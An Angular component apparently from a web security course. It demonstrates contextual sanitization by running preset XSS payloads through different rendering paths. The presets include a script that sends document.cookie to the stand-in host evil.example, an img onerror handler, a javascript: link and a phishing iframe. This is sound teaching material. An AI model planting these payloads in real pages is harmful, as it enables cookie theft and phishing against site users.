import { Component, SecurityContext, computed, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { DomSanitizer } from '@angular/platform-browser';
import { RouterLink } from '@angular/router';

/**
 * Which security topic the page is showing.
 */
type Tab = 'xss' | 'csrf' | 'auth' | 'secrets' | 'headers';

/**
 * Lesson: Security & Sanitization — what Angular protects you from, and what it
 * cannot.
 *
 * Covers Angular's automatic contextual sanitization, `DomSanitizer` and the
 * `bypassSecurityTrust*` escape hatches, CSRF, token storage, secrets in the
 * bundle, and the security headers that belong on the server.
 *
 * The live demo is the load-bearing part: a payload of real attack strings goes
 * through interpolation, `[innerHTML]` and `DomSanitizer.sanitize` side by side,
 * so what survives each path is observed rather than asserted. The lesson people
 * most often need is that Angular's protection is contextual and automatic — and
 * that every `bypassSecurityTrust*` call is a place where it has been switched
 * off deliberately.
 */
@Component({
  selector: 'app-lesson-security',
  imports: [RouterLink, FormsModule],
  styleUrl: './security.css',
  templateUrl: './security.html',
})
export class Security {
  /**
   * Angular's sanitizer, used directly so the demo can show what it strips.
   */
  private readonly sanitizer = inject(DomSanitizer);

  /**
   * The attack payload the demo runs through each rendering path. Deliberately
   * mixes harmless markup with hostile markup, so "sanitized" is visibly different
   * from "escaped".
   */
  protected readonly payload = signal(
    '<b>Bold survives</b>, <i>so does italic</i> — <a href="javascript:alert(1)">a boobytrapped link</a> <img src="x" alt="" onerror="alert(1)"> <script>alert(1)<\/script>',
  );

  /** The exact string Angular's HTML-context sanitizer produces for the payload. */
  protected readonly sanitized = computed(
    () =>
      this.sanitizer.sanitize(SecurityContext.HTML, this.payload()) ||
      '(the sanitizer stripped everything)',
  );

  /**
   * Ready-made payloads, so each attack shape can be tried without typing it.
   */
  protected readonly presets = [
    {
      label: 'script tag',
      html: 'Hello <script>document.location="https://evil.example?c="+document.cookie<\/script> world',
    },
    {
      label: 'img onerror',
      // alt="" keeps the payload a working attack (onerror is the vector) while
      // leaving the sanitized image decorative rather than an unlabelled one.
      html: '<img src="x" alt="" onerror="alert(document.cookie)"> a classic — no script tag needed',
    },
    {
      label: 'javascript: link',
      html: '<a href="javascript:alert(1)">win a free prize</a>',
    },
    {
      label: 'iframe injection',
      html: '<iframe src="https://evil.example/phish"></iframe> invisible credential phishing',
    },
    {
      label: 'harmless rich text',
      html: '<b>Bold</b>, <i>italic</i>, <ul><li>lists</li><li>links: <a href="https://angular.dev">angular.dev</a></li></ul> all survive',
    },
  ];

  /**
   * The selected topic.
   */
  protected readonly activeTab = signal<Tab>('xss');
  /**
   * The topic tabs.
   */
  protected readonly tabs: { id: Tab; label: string }[] = [
    { id: 'xss', label: 'XSS' },
    { id: 'csrf', label: 'CSRF' },
    { id: 'auth', label: 'Auth / JWT' },
    { id: 'secrets', label: 'Secrets' },
    { id: 'headers', label: 'Headers / CSP' },
  ];
}
